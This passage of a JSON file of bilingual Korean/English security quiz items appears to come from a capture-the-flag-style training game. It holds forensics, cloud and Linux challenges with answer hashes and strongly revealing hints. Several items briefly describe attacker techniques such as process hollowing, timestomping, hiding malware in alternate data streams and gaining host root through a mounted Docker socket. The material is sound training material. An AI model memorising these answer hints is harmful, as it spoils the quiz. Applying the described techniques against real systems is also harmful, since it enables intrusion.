      "ko": "압수한 증거가 발견 시점부터 법정 제출까지 누구를 거쳤는지 문서로 남겨, 증거 무결성을 증명하는 절차를 부르는 세 단어(예: `chain of ___`)는?",
      "en": "What three-word term (e.g. `chain of ___`) names the documented trail of everyone who handled a piece of evidence, from seizure to court, proving its integrity?"
    },
    "hints": {
      "ko": [
        "'사슬'을 뜻하는 단어로 시작합니다.",
        "chain of ____."
      ],
      "en": [
        "Starts with the word for 'chain'.",
        "chain of ____."
      ]
    }
  },
  {
    "id": "t4_usbstor",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 155,
    "ci": true,
    "hash": "dd32fb1174150592a3cf077fad0c9542021b1b7833d82ad29de64f3cabc6ebe8",
    "fmt": "레지스트리 키 / registry key",
    "title": {
      "ko": "USB가 남기는 흔적",
      "en": "The Trace a USB Leaves Behind"
    },
    "prompt": {
      "ko": "Windows 레지스트리에서 과거에 연결됐던 USB 저장장치의 시리얼 번호·제조사 정보가 남는 대표 키 이름은? (한 단어)",
      "en": "Which Windows Registry key preserves the serial number and vendor info of previously connected USB storage devices? (one word)"
    },
    "hints": {
      "ko": [
        "`HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\` 아래에 있습니다.",
        "'USB'와 '저장소(storage)'의 합성입니다."
      ],
      "en": [
        "Found under `HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\`.",
        "A blend of 'USB' and 'storage'."
      ]
    }
  },
  {
    "id": "t0_dd",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 50,
    "ci": true,
    "hash": "9b7ecc6eeb83abf9ade10fe38865df4499be3568dcc507ae2ec3b44989cb0093",
    "fmt": "명령어 / command (2글자 / 2 chars)",
    "title": {
      "ko": "비트 단위 그대로 복제",
      "en": "Bit-for-Bit Copy"
    },
    "prompt": {
      "ko": "포렌식에서 원본 저장매체를 변경하지 않고 디스크나 파티션을 비트 단위로 그대로 복제(이미징)할 때 쓰는 고전적인 두 글자짜리 유닉스 명령은?",
      "en": "In forensics, which classic two-letter Unix command makes a bit-for-bit copy (image) of a disk or partition without altering the original media?"
    },
    "hints": {
      "ko": [
        "`____ if=/dev/sda of=disk.img bs=4M` 형태로 사용합니다.",
        "'data duplicator' 또는 'disk dump' 라고도 풀어 부릅니다."
      ],
      "en": [
        "Used as `____ if=/dev/sda of=disk.img bs=4M`.",
        "Sometimes expanded as 'data duplicator' or 'disk dump'."
      ]
    }
  },
  {
    "id": "t1_tcpdump",
    "tier": 1,
    "cat": "network",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "3096fd17ccf8ee00173d4d753aa67e476526b800ae6eff06b055d71fc4ce6dff",
    "fmt": "명령어 / command",
    "title": {
      "ko": "명령줄의 패킷 사냥꾼",
      "en": "The Command-Line Packet Hunter"
    },
    "prompt": {
      "ko": "GUI 없이 터미널에서 네트워크 패킷을 실시간 캡처하고 `.pcap` 로 저장하는 대표적인 명령줄 도구는? (GUI 패킷 분석기의 텍스트판 형제, 한 단어)",
      "en": "Which classic command-line tool captures network packets in real time from a terminal (no GUI) and can save them as `.pcap`? (the text-mode sibling of the well-known GUI analyzer, one word)"
    },
    "hints": {
      "ko": [
        "이름은 'TCP' + 'dump' 의 합성입니다.",
        "`____ -i eth0 -w out.pcap` 형태로 캡처합니다."
      ],
      "en": [
        "Its name blends 'TCP' + 'dump'.",
        "Capture with `____ -i eth0 -w out.pcap`."
      ]
    }
  },
  {
    "id": "t2_carving",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 85,
    "ci": true,
    "hash": "117b405eea833174250f59af5a817ab521ebafecc77441483223441a0ec4a890",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "메타데이터 없이 파일을 건지다",
      "en": "Recover Files With No Metadata"
    },
    "prompt": {
      "ko": "파일시스템 구조나 디렉터리 정보가 손상돼 없을 때, 원시 바이트 스트림에서 알려진 헤더·푸터 시그니처(예: JPEG 의 `FF D8 ... FF D9`)를 찾아 파일을 통째로 복원하는 포렌식 기법을 '파일 ______' 라 부릅니다. 빈칸에 들어갈 영어 한 단어는? (foremost·scalpel 같은 도구가 수행)",
      "en": "When filesystem structures or directory entries are gone, the forensic technique of scanning a raw byte stream for known header/footer signatures (e.g. JPEG's `FF D8 ... FF D9`) to reconstruct whole files is called 'file ______'. What one English word fills the blank? (tools like foremost / scalpel do this)"
    },
    "hints": {
      "ko": [
        "고기를 '발라내다' 라는 뜻의 영어 단어와 같습니다.",
        "`foremost`, `scalpel`, `photorec` 이 이 작업을 수행합니다."
      ],
      "en": [
        "Same English word as slicing/carving meat.",
        "`foremost`, `scalpel`, and `photorec` perform it."
      ]
    }
  },
  {
    "id": "t2_ads",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 90,
    "ci": true,
    "hash": "788eb2efc52660fe41472319f0d2c623be6540c956921b3632fcc934bf1be10d",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "파일 뒤에 숨은 흐름",
      "en": "The Stream Behind the File"
    },
    "prompt": {
      "ko": "NTFS 파일시스템에서 하나의 파일에 눈에 보이지 않는 별도의 데이터 흐름을 덧붙여 악성코드를 숨길 수 있습니다(`notepad file.txt:hidden.exe`). 이 '대체 데이터 스트림' 기능을 가리키는 3글자 영어 약어는?",
      "en": "On NTFS, a file can carry an invisible extra data stream used to hide malware (`notepad file.txt:hidden.exe`). What is the 3-letter English acronym for this 'alternate data stream' feature?"
    },
    "hints": {
      "ko": [
        "'Alternate Data Stream' 의 머리글자입니다.",
        "`dir /r` 또는 `Get-Item -Stream *` 로 탐지합니다."
      ],
      "en": [
        "Initials of 'Alternate Data Stream'.",
        "Detect with `dir /r` or `Get-Item -Stream *`."
      ]
    }
  },
  {
    "id": "t4_mft",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 150,
    "ci": true,
    "hash": "29a44d58cc6374a2e166bb1738c0ca4f012d7ba929f18365ff5f7e75ba99e6b7",
    "fmt": "약어 / acronym (3글자 / 3 chars, $ 제외 / no $)",
    "title": {
      "ko": "모든 파일의 장부",
      "en": "The Ledger of Every File"
    },
    "prompt": {
      "ko": "NTFS 볼륨에서 모든 파일·디렉터리의 이름·타임스탬프·클러스터 위치 등 레코드를 담아, 디스크 포렌식과 타임라인 분석의 핵심이 되는 메타데이터 구조가 있습니다. 이 구조의 3글자 약어는? (파일명에 붙는 `$` 접두사는 빼고 약어만 입력)",
      "en": "On an NTFS volume there is a metadata structure holding a record for every file and directory — names, timestamps, cluster locations — central to disk forensics and timeline analysis. What is its 3-letter acronym? (enter the acronym only, without the `$` prefix its filename carries)"
    },
    "hints": {
      "ko": [
        "'Master File Table' 의 머리글자입니다.",
        "`$` 접두사가 붙는 NTFS 메타파일이며, 각 레코드 크기는 보통 1024바이트."
      ],
      "en": [
        "Initials of 'Master File Table'.",
        "A `$`-prefixed NTFS metafile; each record is usually 1024 bytes."
      ]
    }
  },
  {
    "id": "t4_timestomp",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 155,
    "ci": true,
    "hash": "bd79d5302f5ec355456457038a0bf3fd630f6c0bf6364176acb5ccf878901d1c",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "시간을 지우는 자",
      "en": "The One Who Rewrites Time"
    },
    "prompt": {
      "ko": "공격자가 조사관의 타임라인 분석을 방해하려고 파일의 MACB(수정·접근·변경·생성) 타임스탬프를 위조하는 안티-포렌식 기법이 있습니다. Metasploit/Meterpreter 의 동명 도구로도 유명한, '시간(time)'과 '짓밟다(stomp)'를 합친 이 기법의 한 단어 이름은?",
      "en": "To disrupt an investigator's timeline analysis, attackers forge a file's MACB (Modified/Accessed/Changed/Born) timestamps. What is the one-word name of this anti-forensic technique — blending 'time' + 'stomp' and also the name of a Metasploit/Meterpreter tool?"
    },
    "hints": {
      "ko": [
        "'time' + 'stomp(짓밟다)' 의 합성어입니다.",
        "$STANDARD_INFORMATION 타임스탬프는 바꿔도 $FILE_NAME 은 못 바꾸는 경우가 많아 탐지 단서가 됩니다."
      ],
      "en": [
        "A blend of 'time' + 'stomp'.",
        "It often alters $STANDARD_INFORMATION timestamps but not $FILE_NAME — a detection clue."
      ]
    }
  },
  {
    "id": "t0_authfactor",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 45,
    "ci": true,
    "hash": "cb0356a0532e824bd17b1ad6f24af01a2d9bbdda8891918ab6b91d9835f7c3ec",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "비밀번호만으론 부족하다",
      "en": "A Password Is Not Enough"
    },
    "prompt": {
      "ko": "클라우드 계정 탈취를 막는 가장 기본적인 통제는, 비밀번호에 더해 서로 다른 종류의 인증 요소를 추가로 요구하는 것입니다. 이 통제를 가리키는 3글자 영어 약자는? (`2FA` 를 포함하는 상위 용어)",
      "en": "The most basic control against cloud account takeover is requiring an additional, different kind of authentication factor on top of the password. What is the 3-letter English acronym for this control? (the umbrella term that covers `2FA`)"
    },
    "hints": {
      "ko": [
        "'Multi-Factor Authentication' 의 머리글자입니다.",
        "루트 계정에 이것이 없으면 클라우드 설정 점검 도구가 가장 먼저 경고합니다."
      ],
      "en": [
        "Initials of 'Multi-Factor Authentication'.",
        "Missing it on the root account is the first thing a cloud posture scanner flags."
      ]
    }
  },
  {
    "id": "t1_dockerfile",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 60,
    "ci": true,
    "hash": "75857a45899985be4c4d941e90b6b396d6c92a4c7437aaf0bf102089fe21379d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "이미지의 출발점",
      "en": "Where the Image Starts"
    },
    "prompt": {
      "ko": "Dockerfile에서 베이스 이미지를 지정하는, 보통 파일의 첫 줄에 오는 명령어(instruction)는? (예: `____ ubuntu:22.04`)",
      "en": "Which Dockerfile instruction declares the base image and normally sits on the first line? (e.g. `____ ubuntu:22.04`)"
    },
    "hints": {
      "ko": [
        "'~에서 가져온다'는 뜻의 영어 전치사 4글자입니다.",
        "`FR__` — 태그를 `latest`로 두면 재현성·공급망 위험이 커집니다."
      ],
      "en": [
        "A 4-letter English preposition marking where something originates.",
        "`FR__` — pinning it to `latest` hurts reproducibility and supply-chain safety."
      ]
    }
  },
  {
    "id": "t1_iac",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 60,
    "ci": true,
    "hash": "e914d68f72dbeaa29a91a4c2f9f3108f4cc6f4630a3712982fee13cfb45169fe",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "인프라를 코드로",
      "en": "Infrastructure as Code"
    },
    "prompt": {
      "ko": "웹 UI에서 손으로 클릭하는 대신, 선언적 설정 파일(코드)로 인프라를 프로비저닝·관리하는 방식을 가리키는 3글자 약어는?",
      "en": "What 3-letter acronym names the practice of provisioning and managing infrastructure through declarative definition files (code) instead of clicking through a web UI by hand?"
    },
    "hints": {
      "ko": [
        "Infrastructure as Code.",
        "`I_C` — 변경 이력을 Git으로 추적할 수 있습니다."
      ],
      "en": [
        "Infrastructure as Code.",
        "`I_C` — changes get tracked in Git."
      ]
    }
  },
  {
    "id": "t1_terraform",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 65,
    "ci": true,
    "hash": "94dc3ea57721d541aae09b7bf2368c1e20d4c89996ff6df4349d86048877c0e7",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "선언적 프로비저닝 도구",
      "en": "Declarative Provisioning Tool"
    },
    "prompt": {
      "ko": "HashiCorp가 만든 오픈소스 인프라 자동화 도구로, HCL 언어와 `.tf` 파일로 클라우드 리소스를 선언적으로 프로비저닝하는 도구의 이름은? (한 단어)",
      "en": "Which open-source HashiCorp tool provisions cloud resources declaratively using the HCL language and `.tf` files? (one word)"
    },
    "hints": {
      "ko": [
        "`terra____` — 이름은 '지구'를 뜻합니다.",
        "`.tf` 파일과 `plan`/`apply` 명령을 씁니다."
      ],
      "en": [
        "`terra____` — its name evokes 'earth'.",
        "Uses `.tf` files with `plan`/`apply` commands."
      ]
    }
  },
  {
    "id": "t2_k8sauthz",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "2552b1c0272ab701af519fff4e4299f03720e72a3e3b57f7214b81d13c7eceff",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "역할로 권한을 묶다",
      "en": "Permissions by Role"
    },
    "prompt": {
      "ko": "쿠버네티스와 대부분의 클라우드에서, 권한을 사용자에게 직접 주지 않고 역할에 묶은 뒤 사용자를 그 역할에 바인딩하는 접근 제어 모델의 4글자 영어 약자는?",
      "en": "In Kubernetes and most clouds, permissions are attached to a role and users are bound to that role instead of being granted directly. What is the 4-letter English acronym for this access-control model?"
    },
    "hints": {
      "ko": [
        "'Role-Based Access Control' 의 머리글자입니다.",
        "K8s에서는 `Role`/`ClusterRole` 과 `RoleBinding` 으로 구현합니다."
      ],
      "en": [
        "Initials of 'Role-Based Access Control'.",
        "K8s implements it with `Role`/`ClusterRole` plus `RoleBinding`."
      ]
    }
  },
  {
    "id": "t2_sg",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "b42e18366abaf7d25debe1765391f2a4b1f3a16708045d2e6642a14fc4c93144",
    "fmt": "CIDR 표기 / CIDR notation",
    "title": {
      "ko": "전 세계에 열린 문",
      "en": "Open to the World"
    },
    "prompt": {
      "ko": "보안그룹·방화벽 규칙 감사에서 가장 흔히 지적되는 오설정은 SSH(22번) 포트를 인터넷 전체에 열어두는 것입니다. 이때 소스로 설정된, **모든 IPv4 주소**를 뜻하는 CIDR 표기를 그대로 입력하세요.",
      "en": "The most common finding in security-group/firewall audits is leaving SSH (port 22) open to the entire internet. Enter the CIDR notation used as that source — the one meaning **any IPv4 address**."
    },
    "hints": {
      "ko": [
        "`x.x.x.x/y` 형태이며, 프리픽스 길이가 0이면 주소 전체를 포함합니다.",
        "IPv6에서 이에 대응하는 표기는 `::/0` 입니다."
      ],
      "en": [
        "Form `x.x.x.x/y`; a prefix length of 0 covers every address.",
        "The IPv6 counterpart is `::/0`."
      ]
    }
  },
  {
    "id": "t3_dockersock",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": true,
    "hash": "71329c4cc6e32171553fa81d044eb31d1a3aac52ba9376c4a99f4505c494cf5b",
    "fmt": "절대 경로 / absolute path",
    "title": {
      "ko": "소켓 하나면 호스트가 열린다",
      "en": "One Socket to Own the Host"
    },
    "prompt": {
      "ko": "컨테이너 안에 호스트의 Docker 데몬 유닉스 소켓을 마운트하면 그 컨테이너는 사실상 호스트 root가 됩니다(원하는 특권 컨테이너를 새로 띄울 수 있으므로). 이 소켓의 기본 절대 경로는?",
      "en": "Mounting the host's Docker daemon Unix socket into a container effectively hands it host root (it can spawn any container it likes, with full host access). What is that socket's default absolute path?"
    },
    "hints": {
      "ko": [
        "`/var/run/` 아래에 있는 소켓 파일입니다.",
        "`docker -H unix://<경로>` 의 기본값이며, 파일명은 `docker.____` 입니다."
      ],
      "en": [
        "A socket file under `/var/run/`.",
        "The default for `docker -H unix://<path>`; the file is named `docker.____`."
      ]
    }
  },
  {
    "id": "t3_imdsv2",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 125,
    "ci": true,
    "hash": "373cb2c6d4fe2778441d4f0266505b699fa518d002e5793b87f9b48836de3f62",
    "fmt": "HTTP 메서드 / HTTP method",
    "title": {
      "ko": "토큰 없이는 못 준다",
      "en": "No Token, No Metadata"
    },
    "prompt": {
      "ko": "IMDSv2는 SSRF로 인스턴스 자격증명이 새어나가는 것을 막기 위해, 메타데이터를 읽기 전에 먼저 세션 토큰을 발급받도록 요구합니다(`/latest/api/token`). 이 토큰 요청에 사용하는 HTTP 메서드는? — 평범한 SSRF로는 흉내내기 어려운 메서드라는 점이 방어의 핵심입니다.",
      "en": "IMDSv2 stops SSRF-based credential theft by requiring a session token before metadata can be read (`/latest/api/token`). Which HTTP method issues that token request? The defense works precisely because plain SSRF struggles to send it."
    },
    "hints": {
      "ko": [
        "GET도 POST도 아닙니다. REST에서 자원의 생성·교체에 쓰는 메서드입니다.",
        "3글자이며, `X-aws-ec2-metadata-token-ttl-seconds` 헤더와 함께 보냅니다."
      ],
      "en": [
        "Neither GET nor POST — the REST verb for create/replace.",
        "Three letters, sent with the `X-aws-ec2-metadata-token-ttl-seconds` header."
      ]
    }
  },
  {
    "id": "t0_writeblocker",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 50,
    "ci": true,
    "hash": "86769308ebb37d8caa407ecbcd1b314ea73428e47970f46d1d8828b2badda879",
    "fmt": "장비 이름 / device name (두 단어 / two words)",
    "title": {
      "ko": "증거를 지키는 한 방향 장치",
      "en": "The One-Way Guardian of Evidence"
    },
    "prompt": {
      "ko": "포렌식 이미징 중 원본 저장매체에 단 한 바이트도 기록되지 않도록, 쓰기 신호를 물리적으로 차단하고 읽기만 허용하는 하드웨어 장치를 무엇이라 부르나요? (영어 두 단어)",
      "en": "During forensic imaging, which hardware device physically blocks all write signals to the original media—allowing only reads—so not a single byte is altered? (two English words)"
    },
    "hints": {
      "ko": [
        "원본 무결성을 보장하는 '증거 보존'의 핵심 장비입니다.",
        "첫 단어는 'read'의 반대, 둘째 단어는 '막는 것/차단기'를 뜻합니다."
      ],
      "en": [
        "It is the key evidence-preservation device that guarantees original integrity.",
        "First word is the opposite of 'read'; the second means something that obstructs or stops."
      ]
    }
  },
  {
    "id": "t1_pemagic",
    "tier": 1,
    "cat": "forensics",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "3ed0256da8da5eabae7aa1680886a2aa394dd7c002eb2f3b02e9f0f9ec9daa2c",
    "fmt": "시그니처 / signature (2글자 / 2 chars)",
    "title": {
      "ko": "윈도우 실행파일의 서명",
      "en": "The Windows Executable's Signature"
    },
    "prompt": {
      "ko": "모든 Windows PE 실행파일(.exe/.dll)은 파일 맨 앞 2바이트가 항상 같은 ASCII 시그니처로 시작합니다. 헥스 에디터로 `.exe`를 열면 첫 두 글자로 보이는 이 매직 시그니처는 무엇인가요? (ELF의 `7F 45 4C 46`에 대응하는 PE의 매직)",
      "en": "Every Windows PE executable (.exe/.dll) begins with the same fixed 2-byte ASCII signature at the very start of the file. Opening a `.exe` in a hex editor, what two letters appear first? (the PE counterpart to ELF's `7F 45 4C 46`)"
    },
    "hints": {
      "ko": [
        "16진수로는 `4D 5A` 이며, 이를 ASCII로 읽으면 답이 됩니다.",
        "DOS 시절 설계자 Mark Zbikowski의 이니셜에서 유래했습니다."
      ],
      "en": [
        "In hex it is `4D 5A`; read those bytes as ASCII to get the answer.",
        "It comes from the initials of DOS designer Mark Zbikowski."
      ]
    }
  },
  {
    "id": "t1_dex",
    "tier": 1,
    "cat": "forensics",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "9d0fbf9349f646f1435072f2b0212084752ef4601bd6b012fbbe61b6c5e03930",
    "fmt": "확장자 / extension (3글자 / 3 chars)",
    "title": {
      "ko": "안드로이드가 실행하는 바이트코드",
      "en": "The Bytecode Android Runs"
    },
    "prompt": {
      "ko": "안드로이드 앱을 리버싱할 때, 자바 소스가 컴파일된 뒤 Dalvik/ART 가상머신이 실행하는 바이트코드는 APK 내부의 `classes.___` 파일에 담깁니다. 이 3글자 확장자는 무엇인가요?",
      "en": "When reversing an Android app, the bytecode executed by the Dalvik/ART VM (after Java is compiled) lives inside the APK as a `classes.___` file. What is this three-letter extension?"
    },
    "hints": {
      "ko": [
        "'Dalvik EXecutable'의 약자입니다.",
        "`apktool`이나 `jadx`로 이 파일을 열어 스마트폰 악성코드를 분석합니다."
      ],
      "en": [
        "It is short for 'Dalvik EXecutable'.",
        "You open this file with `apktool` or `jadx` to analyze mobile malware."
      ]
    }
  },
  {
    "id": "t2_packing",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 85,
    "ci": true,
    "hash": "7c6e059c91d86331d06879929b56905cb02d57df32d4c491744e7b3e7eb9918a",
    "fmt": "한 단어 / one word (-ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "정적 분석을 무력화하는 압축",
      "en": "The Compression That Blinds Static Analysis"
    },
    "prompt": {
      "ko": "악성코드가 실제 코드를 압축·암호화해 껍데기(stub) 속에 숨기고, 실행 시점에만 메모리에서 원본을 복원해 정적 분석과 시그니처 탐지를 회피하는 기법을 무엇이라 하나요? (대표 압축기가 여럿 있으며, 영어 한 단어의 -ing 형태)",
      "en": "What is the technique where malware compresses/encrypts its real code inside a stub and restores the original only in memory at runtime—evading static analysis and signature detection? (several classic packers exist; one English word, the '-ing' form)"
    },
    "hints": {
      "ko": [
        "실행파일을 이 상태로 만드는 도구를 'packer'라고 부릅니다.",
        "이 기법이 적용된 바이너리는 원본 코드가 숨겨져 문자열 추출이 거의 되지 않습니다."
      ],
      "en": [
        "The tool that puts an executable into this state is called a 'packer'.",
        "A binary in this state hides its real code, so string extraction yields almost nothing."
      ]
    }
  },
  {
    "id": "t2_entropy",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 85,
    "ci": true,
    "hash": "67671a2f53dd910a8b35840edb6a0a1e751ae5532178ca7f025b823eee317992",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "무질서도로 숨긴 것을 찾다",
      "en": "Finding the Hidden by Its Disorder"
    },
    "prompt": {
      "ko": "파일이나 PE 섹션의 바이트가 얼마나 무작위·무질서한지를 0~8 사이 수치로 측정해, 값이 8에 가까우면 압축·암호화되었다고 판단하는 정보이론 지표는 무엇인가요? (섀넌이 정의, 영어 한 단어)",
      "en": "Which information-theory metric scores how random/disordered the bytes of a file or PE section are on a 0–8 scale—so a value near 8 signals compression or encryption? (defined by Shannon; one English word)"
    },
    "hints": {
      "ko": [
        "열역학에서 '무질서도'를 뜻하는 바로 그 단어입니다.",
        "`ent`와 PEStudio가 이 값을 계산해 주고, 펌웨어 이미지를 훑는 도구들도 대개 이 값을 그래프로 그려 줍니다."
      ],
      "en": [
        "It is the very word thermodynamics uses for 'disorder'.",
        "`ent` and PEStudio compute this value for you, and firmware-carving tools usually plot it as a graph."
      ]
    }
  },
  {
    "id": "t3_hollowing",
    "tier": 3,
    "cat": "forensics",
    "track": "forensics",
    "points": 105,
    "ci": true,
    "hash": "34e36214d1921828dd0bb0ed46fdf64a14d0d33aa3757aee9e40acfe9df5711f",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "정상 프로세스의 껍데기를 빼앗다",
      "en": "Stealing a Legit Process's Shell"
    },
    "prompt": {
      "ko": "악성코드가 정상 프로세스를 일시정지 상태로 생성한 뒤, 그 프로세스의 메모리 이미지를 통째로 비워내고(unmap) 악성 PE로 덮어쓴 다음 재개시켜 정상 프로세스로 위장하는 대표적 코드 인젝션 기법을 'process ______'라 부릅니다. 빈칸에 들어갈 영어 한 단어는? (속을 파낸다는 뜻)",
      "en": "Malware spawns a legitimate process in a suspended state, unmaps its entire memory image, overwrites it with a malicious PE, then resumes it to masquerade as the legit process. This classic code-injection technique is called 'process ______'. What one English word fills the blank? (it means to carve out the inside)"
    },
    "hints": {
      "ko": [
        "영어로 '속을 파내다/텅 비게 하다'라는 동사의 -ing 형태입니다.",
        "MITRE ATT&CK의 Process Injection(T1055) 하위 기법으로 분류됩니다."
      ],
      "en": [
        "It is the '-ing' form of an English verb meaning 'to carve out the inside / make empty'.",
        "It is classified under MITRE ATT&CK Process Injection (T1055)."
      ]
    }
  },
  {
    "id": "t0_uname",
    "tier": 0,
    "cat": "linux",
    "track": "system",
    "points": 45,
    "ci": true,
    "hash": "5c0be87ed7434d69005f8bbd84cad8ae6abfd49121b4aaeeb4c1f4a2e2987711",
    "fmt": "명령어 / command",
    "title": {
      "ko": "이 시스템의 정체를 물어라",
      "en": "Ask the System Who It Is"
    },
    "prompt": {
      "ko": "리눅스에서 실행 중인 커널의 이름·버전·머신 아키텍처 같은 시스템 정보를 출력하는 표준 명령은? (`-a` 옵션을 붙이면 전부 한 줄로 쏟아내는 그 명령, 한 단어)",
      "en": "Which standard Linux command prints system information such as the running kernel name, version, and machine architecture? (the one you run with `-a` to dump it all on one line — one word)"
    },
    "hints": {
      "ko": [
        "POSIX 표준 유틸리티이며, 이름은 'unix name' 을 줄인 것입니다.",
        "`____ -r` 은 커널 릴리스만, `____ -m` 은 머신 하드웨어 이름만 출력합니다."
      ],
      "en": [
        "A POSIX standard utility; its name is short for 'unix name'.",
        "`____ -r` prints just the kernel release; `____ -m` prints just the machine hardware name."
      ]
    }
  },
  {
    "id": "t1_readelf",
    "tier": 1,
    "cat": "reversing",
    "track": "system",
    "points": 65,
    "ci": true,
    "hash": "c06edbcb7bfdeb6bc176a30810bed1afd47feb85f65c2bbcf66853164f7515e4",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "ELF 헤더를 낱낱이 펼쳐라",
      "en": "Unfold Every ELF Header"
    },
    "prompt": {
      "ko": "리눅스 ELF 실행파일의 헤더·섹션 테이블·프로그램 헤더·심볼을 상세히 출력하는 binutils 전용 도구는? (`-h` 로 ELF 헤더, `-S` 로 섹션 목록을 보는 그 명령, 한 단어)",
      "en": "Which dedicated binutils tool prints an ELF executable's header, section table, program headers, and symbols in detail? (`-h` shows the ELF header, `-S` the section list — one word)"
    },
    "hints": {
      "ko": [
        "이름은 'read' + 실행파일 포맷 이름(ELF)의 조합입니다.",
        "역어셈블은 하지 않고 ELF 파일의 구조(헤더·섹션·심볼)를 해석해 보여주는 도구입니다."
      ],
      "en": [
        "Its name combines 'read' with the executable format's name (ELF).",
        "It does not disassemble — it parses and displays the ELF structure (headers, sections, symbols)."
      ]
    }
  },
  {
    "id": "t1_objdump",
    "tier": 1,
    "cat": "reversing",
    "track": "system",
    "points": 70,
    "ci": true,
    "hash": "306e2b4264b7dbf0107520e1823108bd5d17635be7742b6f9660a6c527cb4fd2",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "바이너리를 어셈블리로 풀어헤쳐라",
      "en": "Spill a Binary into Assembly"
    },
    "prompt": {
      "ko": "실행파일의 기계어를 역어셈블(`-d`)해 어셈블리로 보여 주는 대표적인 binutils 도구는? (오브젝트 파일을 통째로 덤프한다는 뜻의 이름, 한 단어)",
      "en": "Which classic binutils tool disassembles (`-d`) a binary's machine code into assembly? (its name means 'dump the object file' — one word)"
    },
    "hints": {
      "ko": [
        "이름은 'object' 와 'dump' 를 붙인 합성어입니다.",
        "`____ -d ./bin` 으로 .text 섹션을 역어셈블합니다."
      ],
      "en": [
        "Its name is 'object' joined with 'dump'.",
        "`____ -d ./bin` disassembles the .text section."
      ]
    }
  },
  {
    "id": "t2_strace",
    "tier": 2,
    "cat": "linux",
    "track": "system",
    "points": 90,
    "ci": true,
    "hash": "761f8a60b54fcf3965300ced84ed9a0db0eb70c89482e61f9e79a1a1ca251f18",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "커널을 두드리는 소리를 엿듣다",
      "en": "Eavesdrop on Every Kernel Call"
    },
    "prompt": {
      "ko": "실행 중인 프로그램이 커널에 요청하는 시스템 콜(open·read·write 등)을 실시간으로 가로채 순서대로 출력해 주는 리눅스 진단 도구는? (라이브러리 호출을 추적하는 `ltrace` 의 시스템 콜 짝, 한 단어)",
      "en": "Which Linux diagnostic tool intercepts and prints, in order, the system calls (open, read, write, …) a running program makes to the kernel? (the syscall counterpart of `ltrace`, which traces library calls — one word)"
    },
    "hints": {
      "ko": [
        "이름은 'system call' 을 뜻하는 한 글자 접두어 + 'trace' 입니다.",
        "`____ -f ./prog` 는 자식 프로세스까지 따라가며 시스템 콜을 기록합니다."
      ],
      "en": [
        "Its name is a one-letter prefix for 'system call' + 'trace'.",
        "`____ -f ./prog` follows child processes while logging syscalls."
      ]
    }
  },
  {
    "id": "t3_pie",
    "tier": 3,
    "cat": "pwn",
    "track": "system",
    "points": 120,
    "ci": true,
    "hash": "558211ed72b2d6967037419dff6f1e7cfd002d178c8fdeeb1239760d4e4c4059",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "실행파일마저 매번 자리를 바꾸게 하라",
      "en": "Even the Executable Won't Sit Still"
    },
    "prompt": {
      "ko": "로더의 주소 무작위화가 실행파일 본체(.text 등)의 로드 주소까지 매 실행마다 흩어놓을 수 있도록, 위치 독립적으로 컴파일된 실행파일을 가리키는 3글자 약어는? (`checksec` 이 이 항목을 enabled/disabled 로 보고하며, 이것이 없으면 실행파일의 코드 주소가 고정됩니다)",
      "en": "What 3-letter abbreviation names an executable compiled position-independently, so the loader's address randomization can cover even the main program's load address (.text, …) on every run? (`checksec` reports this field as enabled/disabled; without it the executable's code addresses stay fixed)"
    },
    "hints": {
      "ko": [
        "Position-______ Executable 세 단어의 머리글자입니다.",
        "checksec 출력에서 'No ___' 로 표시되면 코드 주소가 고정이라 가젯 주소가 예측 가능해집니다."
      ],
      "en": [
        "It is the initials of Position-______ Executable.",
        "checksec shows 'No ___' when code addresses are fixed, making gadget addresses predictable."
      ]
    }
  },
  {
    "id": "t4_tcache",
    "tier": 4,
    "cat": "pwn",
    "track": "system",
    "points": 155,
    "ci": true,
    "hash": "30bf9a328005656691e93a15d16168cee5fa58f1fe4ff4c2d9d1f9d8baf42253",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "해제된 청크의 은밀한 캐시를 노려라",
      "en": "Poison the Cache of Freed Chunks"
    },
    "prompt": {
